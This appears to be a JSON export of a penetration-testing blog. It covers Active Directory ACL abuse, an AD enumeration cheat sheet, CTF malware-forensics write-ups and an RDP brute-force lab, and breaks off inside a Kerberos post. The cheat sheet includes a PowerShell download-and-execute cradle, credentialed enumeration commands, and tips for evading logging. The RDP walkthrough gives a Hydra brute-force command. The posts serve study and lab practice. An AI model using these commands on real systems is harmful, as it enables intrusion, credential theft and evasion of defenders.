[{"title":"ACL AD","url":"/2024/01/04/acls/","content":"Access Control List (ACL) Abuse PrimerFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\nAccess Control List (ACL) OverviewIn their simplest form, ACLs are lists that define a) who has access to which asset&#x2F;resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.\nThere are two types of ACLs:\nDiscretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.\n\nSystem Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.\n\n\nWe see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.\nViewing forend’s ACL\nThe SACLs can be seen within the Auditing tab.\nViewing the SACLs through the Auditing Tab\n\nAccess Control Entries (ACEs)As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:\nACE\tDescription\n\nAccess denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object\nAccess allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object\nSystem audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred\n\nEach ACE is made up of the following four components:\nThe security identifier (SID) of the user&#x2F;group that has access to the object (or principal name graphically)A flag denoting the type of ACE (access denied, allowed, or system audit ACE)A set of flags that specify whether or not child containers&#x2F;objects can inherit the given ACE entry from the primary or parent objectAn access mask which is a 32-bit value that defines the rights granted to an objectWe can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:\nViewing Permissions through Active Directory Users &amp; Computers\n\nThe security principal is Angela Dunn (adunn@inlanefreight.local)\nThe ACE type is Allow\nInheritance applies to the “This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted\nThe rights granted to the object, again shown graphically in this example\n\nWhen access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.\nWhy are ACEs Important?Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the “low hanging fruit” AD flaws&#x2F;misconfigurations, ACL abuse can be a great way for us to move laterally&#x2F;vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:\n\nForceChangePassword abused with Set-DomainUserPassword\nAdd Members abused with Add-DomainGroupMember\nGenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember\nGenericWrite abused with Set-DomainObject\nWriteOwner abused with Set-DomainObjectOwner\nWriteDACL abused with Add-DomainObjectACL\nAllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember\nAddself abused with Add-DomainGroupMember\n\nenumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\nForceChangePassword - gives us the right to reset a user’s password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).\nGenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.\nAddSelf - shows security groups that a user can add themselves to.\nGenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.\n\nThis graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.\n\nWe will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It’s worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.\nACL Attacks in the WildWe can use ACL attacks for:\n\nLateral movement\nPrivilege escalation\nPersistence\n\nSome common attack scenarios may include:\nAttack Description\n\n\nAttack\nDescription\n\n\n\nAbusing forgot password permissions\nHelp Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.\n\n\nAbusing group membership management\nIt’s also common to see Help Desk and other staff that have the right to add&#x2F;remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.\n\n\nExcessive user rights\nWe also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.\n\n\nNote: Some ACL attacks can be considered “destructive,” such as changing a user’s password or performing other modifications within a client’s AD domain. If in doubt, it’s always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.\n","categories":["Research"],"tags":["Active-Directory","access control list"]},{"title":"AD CRED ENUM","url":"/2023/08/09/ad-credential-enumeration/","content":"\nCredential EnumerationAfter acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\n\nDomain users\nComputer Attributes\ngroup membership\nGroup Policy Objects\nPermissions\nACLs\nTrusts\n\nbut not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.\nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.\nCrackMapExec.This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.\nDomain UserEnumWhen enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a badPwdCount attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users\nDomain Group EnumWe can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx  --groups \nWe can begin to note down groups of interest. Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.\nSmbmapA tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. \nrecursive list Dirs in Sharessmbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only\nRpcClientUsed to enumerate, add, change and even remove objects from AD.\nEnumerationRelative Identifier (RID) is a unique identifier utilized to track and identify objects, for example:\n\nThe SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.\n\nWhen an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\n\nSo the domain user htb-student with a RID:[0x457] Hex 0x457 would &#x3D; decimal 1111, will have a full user SID of S-1-5-21-3842939050-3880317879-2865463114-1111.\n\nThis is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\n\n\nSome accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have 500 or 0x1f4 this value is unique to an object hence we can use it to enumerate further info from the domain.\nImpacket-Toolkitimpacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. \nPsexec.pyA clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.\nOnce comms are established it provides a shell as a SYSTEM on the victim host.\nwindapsearchWindapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da(enumerate domain admins group members ) option and the -PU( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.\nDomain-Adminspython3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\nThis enumerates Domain Admin Groups.\nPrivileged UsersChecking for potential users, using -PU with elevated privileges that may have gone unnoticed.\nN&#x2F;B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.\npython3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\nBloodHoundOnce you have the domain credentials, you can run BloodHound.py a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.\n\nWindows\n\nAt this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup\n\nDo any trusts exist with other domains both inside &amp; outside the current forest?\nFiles shares that our user has access to.\n\nActiveDirectory Powershell ModulesThese are groups of Powershell cmdlets for enumerating AD environments.\nGet-ADDomain - Print out domain SID, domain functional level, and child domains.\nGet-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName This will filter ACC with the serviceprincipalname property populated and also get us a listing ACC that may be susceptible to kerberos attacks.\nGet-ADTrust -Filter * - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.\nGet-ADGroup -Filter * | select name - Group enumeration\nGet-ADGroup -Identity &quot;Backup Operators&quot; - Detailed Group Info\nGet-ADGroupMember -Identity &quot;Backup Operators&quot; - Getting Group Membership\nPowerviewIt identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.\nIt gives an insight into the security posture of the target domain. \n\ncommands\n\n\n\n\nCommand\nDescription\n\n\n\nExport-PowerViewCSV\nAppend results to a CSV file\n\n\nConvertTo-SID\nConvert a User or group name to its SID value\n\n\nGet-DomainSPNTicket\nRequests the Kerberos ticket for a specified Service Principal Name (SPN) account\n\n\nDomain&#x2F;LDAP Functions\n\n\n\nGet-Domain\nWill return the AD object for the current (or specified) domain\n\n\nGet-DomainController\nReturn a list of the Domain Controllers for the specified domain\n\n\nGet-DomainUser\nWill return all users or specific user objects in AD\n\n\nGet-DomainComputer\nWill return all computers or specific computer objects in AD\n\n\nGet-DomainGroup\nWill return all groups or specific group objects in AD\n\n\nGet-DomainOU\nSearch for all or specific OU objects in AD\n\n\nFind-InterestingDomainAcl\nFinds object ACLs in the domain with modification rights set to non-built in objects\n\n\nGet-DomainGroupMember\nWill return the members of a specific domain group\n\n\nGet-DomainFileServer\nReturns a list of servers likely functioning as file servers\n\n\nGet-DomainDFSShare\nReturns a list of all distributed file systems for the current (or specified) domain\n\n\nGPO Functions:\n\n\n\nGet-DomainGPO\nWill return all GPOs or specific GPO objects in AD\n\n\nGet-DomainPolicy\nReturns the default domain policy or the domain controller policy for the current domain\n\n\nComputer Enumeration Functions:\n\n\n\nGet-NetLocalGroup\nEnumerates local groups on the local or a remote machine\n\n\nGet-NetLocalGroupMember\nEnumerates members of a specific local group\n\n\nGet-NetShare\nReturns open shares on the local (or a remote) machine\n\n\nGet-NetSession\nWill return session information for the local (or a remote) machine\n\n\nTest-AdminAccess\nTests if the current user has administrative access to the local (or a remote) machine\n\n\nThreaded ‘Meta’-Functions\n\n\n\nFind-DomainUserLocation\nFinds machines where specific users are logged in\n\n\nFind-DomainShare\nFinds reachable shares on domain machines\n\n\nFind-InterestingDomainShareFile\nSearches for files matching specific criteria on readable shares in the domain\n\n\nFind-LocalAdminAccess\nFind machines on the local domain where the current user has local administrator access\n\n\nDomain Trust Functions\n\n\n\nGet-DomainTrust\nReturns domain trusts for the current domain or a specified domain\n\n\nGet-ForestTrust\nReturns all forest trusts for the current forest or a specified forest\n\n\nGet-DomainForeignUser\nEnumerates users who are in groups outside of the user’s domain\n\n\nGet-DomainForeignGroupMember\nEnumerates groups with users outside of the group’s domain and returns each foreign member\n\n\nGet-DomainTrustMapping\nWill enumerate all trusts for the current domain and any others seen.\n\n\nDomain User Info        \nGet-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\nRecursive Group Membership\nGet-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.\nTrust Enumeration.\nGet-DomainTrustMapping test for local admin access on either the current machine or the remote one.\nTesting for Local Admin Access \nTest-AdminAccess -ComputerName ACADEMY-EA-MS01\nUsers with SPN Set\nGet-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\nSharesAllows users on the domain to quickly access info relevant to their daily roles and share content with their organization. \nSnaffler A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.\nLiving off the LandDiscussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.\nMost enterprise environments have network monitoring and logging, including IDS&#x2F;IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.\nEnv Enumeration Host &amp; Network Recon\n\n\nCommand\nResult\n\n\n\nhostname\nPrints the PC’s Name\n\n\n[System.Environment]::OSVersion.Version\nPrints out the OS version and revision level\n\n\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nPrints the patches and hotfixes applied to the host\n\n\nipconfig &#x2F;all\nPrints out network adapter state and configurations\n\n\nset %USERDOMAIN%\nDisplays the domain name to which the host belongs (ran from CMD-prompt)\n\n\nset %logonserver%\nPrints out the name of the Domain controller the host checks in with (ran from CMD-prompt)\n\n\nPowershellIt provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.\n\n\n\nCmd-Let\nDescription\n\n\n\nGet-Module\nLists available modules loaded for use.\n\n\nGet-ExecutionPolicy -List\nWill print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host.\n\n\nSet-ExecutionPolicy Bypass -Scope Process\nThis will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host.\n\n\nGet-Content C:\\Users&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\nWith this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.\n\n\nGet-ChildItem Env:\nft Key, Value\n\n\npowershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘URL to download the file from’); “\nThis is a quick and easy way to download a file from the web using PowerShell and call it from memory.\n\n\nOPSec TacticsA few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.\nExample\nPowershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders’ radar while utilizing resources built into the hosts to our advantage.\n\nChecking Defenses.These few commands will utilize the netsh and sc to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\nFirewall check - netsh advfirewall show allprofiles\nDefender check cmd - sc query windefend\nChecking the status and configuration settings - Get-MpComputerStatus\nAm I Alone?When landing on a host for the first time, it’s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.\nIf a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\nNetwork Enumeration\n\n\nNetworking Commands\nDescription\n\n\n\narp -a\nLists all known hosts stored in the arp table.\n\n\nipconfig &#x2F;all\nPrints out adapter settings for the host. We can figure out the network segment from here.\n\n\nroute print\nDisplays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.\n\n\nnetsh advfirewall shows state\nDisplays the status of the host’s firewall. We can determine if it is active and filtering traffic.\n\n\nWindows Management Instrumentation (WMI) This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.\nQuick WMI checks\n\n\n\nCommand\nDescription\n\n\n\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nPrints the patch level and description of the Hotfixes applied\n\n\nwmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:List\nDisplays basic host information to include any attributes within the list\n\n\nwmic process list &#x2F;format:list\nA listing of all processes on host\n\n\nwmic ntdomain list &#x2F;format:list\nDisplays information about the Domain and Domain Controllers\n\n\nwmic useraccount list &#x2F;format:list\nDisplays information about all local accounts and any domain accounts that have logged into the device\n\n\nwmic group list &#x2F;format:list\nInformation about all local groups\n\n\nwmic sysaccount list &#x2F;format:list\nDumps information about any system accounts that are being used as service accounts.\n\n\nThis cheatsheet has some useful commands for querying host and domain info using wmic.\nNet CommandsAre useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.\n\n\n\nCommand\nDescription\n\n\n\nnet accounts\nInformation about password requirements\n\n\nnet accounts &#x2F;domain\nPassword and lockout policy\n\n\nnet group &#x2F;domain\nInformation about domain groups\n\n\nnet group “Domain Admins” &#x2F;domain\nList users with domain admin privileges\n\n\nnet group “domain computers” &#x2F;domain\nList of PCs connected to the domain\n\n\nnet group “Domain Controllers” &#x2F;domain\nList PC accounts of domains controllers\n\n\nnet group  &#x2F;domain\nUser that belongs to the group\n\n\nnet groups &#x2F;domain\nList of domain groups\n\n\nnet localgroup\nAll available groups\n\n\nnet localgroup administrators &#x2F;domain\nList users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)\n\n\nnet localgroup Administrators\nInformation about a group (admins)\n\n\nnet localgroup administrators [username] &#x2F;add\nAdd user to administrators\n\n\nnet share\nCheck current shares\n\n\nnet user  &#x2F;domain\nGet information about a user within the domain\n\n\nnet user &#x2F;domain\nList all users of the domain\n\n\nnet user %username%\nInformation about the current user\n\n\nnet use x: \\computer\\share\nMount the share locally\n\n\nnet view\nGet a list of computers\n\n\nnet view &#x2F;all &#x2F;domain[:domainname]\nShares on the domains\n\n\nnet view \\computer &#x2F;ALL\nList shares of a computer\n\n\nnet view &#x2F;domain\nList of PCs of the domain\n\n\nNet Command Tip.If you are in an environment where network defenders are actively logging&#x2F;looking for any commands out of the normal you can try typing net1 instead of the net to work out using the net command.\nDsqueryA command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.\nDsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\\Windows\\System32\\dsquery.dll\nA long read but worthy to check up on those commands one might not remember …\n","categories":["Writeups"],"tags":["Active-Directory"]},{"title":"Simple CTF","url":"/2024/01/20/easyCTF/","content":"Hi guys, welcome back to another Tryhackme room starting off the year with.\n","categories":["Writeups"],"tags":["tryhackme","web"]},{"title":"Hacktheboo 2023 CTF","url":"/2023/10/23/forensics/","content":"\nHi 👋, in this article i’ll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn’t touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. \nHope you have a nice read 😅\nBat ProblemsExplanationWe are given the following file:\n\npayload.bat: Malicious bat file.\n\nAs we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).\n\nSolutionFirst, the bat file can be analyzed using Any.Run which is a malware analyzer tool.We will get the following result if we upload the sample on the aforementioned site.\n\nBy analyzing the behavior graph, we notice three actions made:\n\nThe attacker can be seen using cmd to copy PowerShell to a different path with a random name (Earttxmxaqr.png). \nThe attacker then uses cmd again to rename the downloaded bat file and also change it’s extension to .png.bat to avoid detection.\nThe attacker executes the base64 encoded string using the renamed PowerShell executable (-enc argument in Powershell is used to pass a base64 encoded command).\n\n\nBy decoding the string, the flag can be retrieved.\n\nTrick or TreatExplanationWe are given the following file:\n\ncapture.pcap: Packet capture file\ntrick_or_treat.lnk: The malicious file\n\nSince the malicious file is provided by HTB, we can first gain additional information on it through VirusTotal, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called windowsliveupdater.com. We also can notice that the file is connected to a few IP addresses, mainly 209.197.3.8 which is the malicious one.\n\nAnalyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.\nAs shown in the picture below, the malicious file seems to download malicious data from http://windowsliveupdater.com using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable ($vurnwos) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with 0x1d on each character and the output is appended to the $vurnwos string. Finally, it executes the variable using Invoke-Command. It also attempts to execute an empty variable ($asvods).\n\nAfter knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter HTTP packets only.\n\nGoing through the HTTP packets, we find a packet that shows the victim sending a GET request to http://windowsliveupdater.com. Analyzing the User-Agent, we can see that it is one of the randomized user agents set in the malicious file.\n\nNow we know that that the IP address 77.74.198.52 is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.\n\n\nSolutionSince we know that the downloable content is encoded in hex and also XOR’ed using this key 0x1d, we can use CyberChef to extract the content.\n\nValHalloweenExplanationWe are given the following file:\n\nLogs: Directory containing various Windows XML EventLog (.evtx) files\n\nIn this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.\nSolution\nWhat are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)\n\n\nAnswer: 103.162.14.116:8888\n\nTo complete this question, we can analyze the Security log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware (‘mscalc.exe’) from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20&#x2F;9&#x2F;2023.\n\n\nAccording to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)\n\n\nAnswer: B94F3FF666D9781CB69088658CD53772\n\nTo complete this question, we can analyze the sysmon log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.\n\n\nBased on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)\n\n\nAnswer: lokilocker\n\nTo complete this question, just put the ransomware’s MD5 hash to any OSINT tool and check its family labels.\n\n\nWhat is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)\n\n\nAnswer: Loki\n\nTo complete this question, we can analyze the sysmon log file and filter the logs with keyword ‘schtasks’ which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.\n\n\nWhat are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)\n\n\nAnswer: powershell.exe_3856\n\nTo complete this question, we can analyze the sysmon log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.\n\n\nFollowing the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf)\n\n\nAnswer: C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx\n\nTo complete this question, we can analyze the Security log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious .docx file\n\n\n\n\nWhen was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)\n\n\nAnswer: 2023-09-20_03:03:20\n\nTo complete this question, we can just view the XML format of the .docx file and find the TimeCreated SystemTime row. ENSURE THE TIME FORMAT IS IN UTC!\n\n","categories":["Writeups"],"tags":["ctf"]},{"title":"INSECURE RDP","url":"/2023/10/13/insecure-rdp/","content":"Objective: \nExploit the application and retrieve the flag!\nEnumerationRunning nmap on our target, we see there’s a distinct port 3333 with a very peculiar service dec-notes. Our focus primarily will be exploiting the insecure rdp service.\n\nMetasploitTo confirm if the target is running rdp we’ll use a metasploit module called rdp-scanner what it does is it attempts to connect to the specified RDP port and determines if it “speaks” RDP. \nSetting up the required variables for the module, we get an interesting response it’s running RDP!!\n\nBruteforcing credentialsBut for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we’ll need to bruteforce some credentials.\nWe’ll need to use hydra for this bruteforce.\nhydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 \n\nSo basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.\nAs we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we’ll login with that one to get the flag.\n\nN|Bduring an engagement it’s necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.\nRDP loginHaving enumerated some credentials, we can login via rdp using the xfreerdp tool since that’s what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.\nMoving forward we’ll login via xfreerdp.\n\n\nWe see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:&#x2F; drive.\n\nMitigation Against BruteforceThe Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing “secpol.msc”. \nChecking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.\n\nTo get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. \nThe first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.\n\nAfter trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.\n\nAs we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. \n","categories":["Writeups"],"tags":["rdp"]},{"title":"Kerberos","url":"/2023/07/13/kerberos-101/","content":"\nKerberoastingThe Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\nNB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]\n\nHow Kerb Auth works!In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.\n\nKerberos uses symmetric cryptography for encryption and decryption.\nFor explanation purposes, we use three colours to distinguish Hashes:\n\nBLUE _KEY: User NTLM HASH\nYELLOW_KEY: Krbtgt NTLM HASH\nRED_KEY: Service NTLM HASH\n\nStep 1: By sending the request message to KDC, the client initializes communication as:\nKRB_AS_REQ contains the following:\n\nThe username of the client is to be authenticated.\nThe service SPN (SERVICE PRINCIPAL NAME) linked with the Krbtgt account\nAn encrypted timestamp (Locked with User Hash: Blue Key)\n\nThe entire message is encrypted using the User NTLM hash (Locked with BLUE KEY) to authenticate the user and prevent replay attacks.\nStep 2: The KDC uses a database consisting of Users&#x2F;Krbtgt&#x2F;Services hashes to decrypt a message (Unlock with BLUE KEY) that authenticates user identification.\nThen KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.\nKRB_AS_REP contains the following:\n\nUsername\nSome encrypted data, (Locked with User Hash: Blue Key) that contains:\nSession key\nThe expiration date of TGT\nTGT, (Locked with Krbtgt Hash: Yellow Key) which contains:\nUsername\nSession key\nThe expiration date of TGT\nPAC with user privileges, signed by KDC\n\n\nStep 3: The KRB_TGT will be 